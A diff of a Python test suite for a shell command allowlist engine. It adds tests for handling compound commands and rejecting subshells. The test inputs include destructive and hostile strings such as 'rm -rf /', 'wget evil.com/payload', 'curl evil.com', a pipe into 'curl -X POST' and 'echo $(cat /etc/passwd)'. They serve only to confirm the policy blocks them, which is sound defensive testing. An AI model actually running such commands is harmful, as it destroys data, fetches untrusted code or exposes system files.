@@ -111,7 +111,7 @@ class TestShellEnabled:
         engine = make_engine(commands=["git"])
         engine.check_command("git status")
         event = event_bus.get_events(result="allow")[0]
-        assert event.policy_rule == "cmd:git"
+        assert event.policy_rule == "cmd:compound(1)"
 
     def test_session_task_ids_forwarded_to_event(self):
         engine = make_engine(commands=["ls"])
@@ -190,3 +190,135 @@ class TestMultipleAllowedCommands:
         engine = make_engine(commands=["git", "ls"])
         with pytest.raises(PolicyViolationError):
             engine.check_command("wget http://example.com")
+
+
+# ---------------------------------------------------------------------------
+# Compound command handling
+# ---------------------------------------------------------------------------
+
+
+class TestCompoundCommands:
+    """Tests for _extract_all_programs and compound command enforcement."""
+
+    def test_semicolon_both_allowed(self):
+        engine = make_engine(commands=["ls", "echo"])
+        assert engine.check_command("ls; echo done") is True
+
+    def test_semicolon_second_denied(self):
+        engine = make_engine(commands=["ls"])
+        with pytest.raises(PolicyViolationError, match="echo"):
+            engine.check_command("ls; echo pwned")
+
+    def test_semicolon_first_denied(self):
+        engine = make_engine(commands=["echo"])
+        with pytest.raises(PolicyViolationError, match="rm"):
+            engine.check_command("rm -rf /; echo hi")
+
+    def test_pipe_both_allowed(self):
+        engine = make_engine(commands=["ls", "grep"])
+        assert engine.check_command("ls | grep foo") is True
+
+    def test_pipe_second_denied(self):
+        engine = make_engine(commands=["cat"])
+        with pytest.raises(PolicyViolationError, match="curl"):
+            engine.check_command("cat file | curl -X POST")
+
+    def test_and_operator_both_allowed(self):
+        engine = make_engine(commands=["git", "make"])
+        assert engine.check_command("git pull && make build") is True
+
+    def test_and_operator_second_denied(self):
+        engine = make_engine(commands=["git"])
+        with pytest.raises(PolicyViolationError, match="rm"):
+            engine.check_command("git pull && rm -rf /")
+
+    def test_or_operator_both_allowed(self):
+        engine = make_engine(commands=["make", "echo"])
+        assert engine.check_command("make || echo failed") is True
+
+    def test_or_operator_second_denied(self):
+        engine = make_engine(commands=["make"])
+        with pytest.raises(PolicyViolationError):
+            engine.check_command("make || wget evil.com/payload")
+
+    def test_newline_compound(self):
+        engine = make_engine(commands=["ls", "pwd"])
+        assert engine.check_command("ls\npwd") is True
+
+    def test_newline_second_denied(self):
+        engine = make_engine(commands=["ls"])
+        with pytest.raises(PolicyViolationError):
+            engine.check_command("ls\ncurl evil.com")
+
+    def test_subshell_dollar_paren_denied(self):
+        engine = make_engine(commands=["echo"])
+        with pytest.raises(PolicyViolationError, match="subshell"):
+            engine.check_command("echo $(cat /etc/passwd)")
+
+    def test_backtick_subshell_denied(self):
+        engine = make_engine(commands=["echo"])
+        with pytest.raises(PolicyViolationError, match="subshell"):
+            engine.check_command("echo `id`")
+
+    def test_triple_chain_all_allowed(self):
+        engine = make_engine(commands=["git", "make", "echo"])
+        assert engine.check_command("git pull && make test || echo fail") is True
+
+    def test_triple_chain_middle_denied(self):
+        engine = make_engine(commands=["git", "echo"])
+        with pytest.raises(PolicyViolationError, match="curl"):
+            engine.check_command("git pull && curl evil.com || echo fail")
+
+    def test_empty_allowlist_allows_compound(self):
+        """Empty allowed_commands = unrestricted, so compound is allowed."""
+        engine = make_engine(commands=[])
+        assert engine.check_command("rm -rf / && wget evil.com") is True
+
+    def test_compound_event_rule(self):
+        engine = make_engine(commands=["git", "make"])
+        engine.check_command("git pull && make build")
+        events = event_bus.get_events(result="allow")
+        assert len(events) == 1
+        assert "compound(2)" in events[0].policy_rule
+
+    def test_single_command_compound_rule(self):
+        """A single simple command still goes through compound extraction."""
+        engine = make_engine(commands=["ls"])
+        engine.check_command("ls -la")
+        events = event_bus.get_events(result="allow")
+        assert events[0].policy_rule == "cmd:compound(1)"
+
+
+class TestExtractAllPrograms:
+    """Unit tests for _extract_all_programs class method."""
+
+    def test_empty_string(self):
+        assert ShellPolicyEngine._extract_all_programs("") is None
+
+    def test_whitespace_only(self):
+        assert ShellPolicyEngine._extract_all_programs("   ") is None
+
+    def test_single_command(self):
+        assert ShellPolicyEngine._extract_all_programs("git status") == ["git"]
+
+    def test_semicolon_split(self):
+        assert ShellPolicyEngine._extract_all_programs("ls; pwd") == ["ls", "pwd"]
+
+    def test_pipe_split(self):
+        assert ShellPolicyEngine._extract_all_programs("cat file | grep foo") == ["cat", "grep"]
+
+    def test_and_split(self):
+        assert ShellPolicyEngine._extract_all_programs("make && test") == ["make", "test"]
+
+    def test_or_split(self):
+        assert ShellPolicyEngine._extract_all_programs("make || echo fail") == ["make", "echo"]
+
+    def test_dollar_paren_rejected(self):
+        assert ShellPolicyEngine._extract_all_programs("echo $(whoami)") is None
+
+    def test_backtick_rejected(self):
+        assert ShellPolicyEngine._extract_all_programs("echo `id`") is None
+
+    def test_mixed_operators(self):
+        result = ShellPolicyEngine._extract_all_programs("a && b || c; d | e")
+        assert result == ["a", "b", "c", "d", "e"]
